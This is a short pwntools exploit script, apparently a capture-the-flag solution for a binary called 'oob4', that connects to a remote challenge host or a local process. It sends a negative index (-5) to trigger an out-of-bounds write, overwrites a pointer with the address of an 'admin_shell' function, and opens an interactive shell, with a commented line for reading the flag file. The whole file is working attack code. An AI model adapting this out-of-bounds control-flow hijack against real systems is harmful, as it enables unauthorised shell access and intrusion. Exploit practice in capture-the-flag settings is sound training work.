#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './oob4'
LIBC = ''
HOST = '140.110.112.77'
PORT = 3114

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

admin_shell = 0x4007e6
r.sendline(str(-5))
r.send(p64(admin_shell))
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
